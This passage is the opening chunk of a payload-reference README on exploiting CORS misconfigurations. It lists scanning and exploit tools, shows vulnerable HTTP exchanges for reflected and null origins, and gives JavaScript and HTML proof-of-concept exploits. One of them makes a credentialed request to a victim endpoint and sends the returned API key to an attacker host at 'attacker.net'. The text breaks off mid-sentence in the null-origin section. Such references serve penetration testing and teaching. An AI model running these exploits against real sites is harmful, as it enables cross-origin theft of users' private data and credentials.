<!-- source: CORS Misconfiguration/README.md | chunk 1/3 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

# CORS Misconfiguration

> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker's site using the victim's credentials.

## Summary

* [Tools](#tools)
* [Requirements](#requirements)
* [Methodology](#methodology)
    * [Origin Reflection](#origin-reflection)
    * [Null Origin](#null-origin)
    * [XSS on Trusted Origin](#xss-on-trusted-origin)
    * [Wildcard Origin without Credentials](#wildcard-origin-without-credentials)
    * [Expanding the Origin](#expanding-the-origin)
* [Labs](#labs)
* [References](#references)

## Tools

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool

## Requirements

* BURP HEADER> `Origin: https://evil.com`
* VICTIM HEADER> `Access-Control-Allow-Credential: true`
* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`

## Methodology

Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.

### Origin Reflection

#### Vulnerable Implementation

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof Of Concept

This PoC requires that the respective JS script is hosted at `evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

or

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Null Origin

#### Vulnerable Implementation

It's possible that the server does not reflect the complete `Origin` header but
that the `null` origin is allowed. This would look like this in the server's
response:

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof Of Concept

This can be exploited by putting the attack code into an iframe using the data
URI scheme. If the data URI scheme is used, the browser will use the `null`
